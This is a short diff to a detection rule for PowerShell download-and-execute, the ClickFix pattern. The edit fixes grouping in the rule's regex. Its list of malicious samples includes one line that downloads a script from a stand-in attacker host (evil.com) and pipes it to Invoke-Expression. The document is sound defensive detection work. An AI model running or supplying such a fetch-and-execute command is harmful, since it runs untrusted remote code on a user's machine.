@@ -4,7 +4,7 @@ description: >
   Detects WebClient.DownloadString piped to IEX. Classic ClickFix pattern for in-memory script execution.
 
 pattern: |
-  (?i)(iex|invoke-expression).*webclient.*download(string|file).*https?://|webclient.*download(string|file).*https?://.*(iex|invoke-expression|\|)
+  (?i)((iex|invoke-expression).*webclient.*download(string|file).*https?://|webclient.*download(string|file).*https?://.*(iex|invoke-expression|\|))
 
 malicious:
   - '(New-Object Net.WebClient).DownloadString("http://evil.com/p.ps1") | IEX'
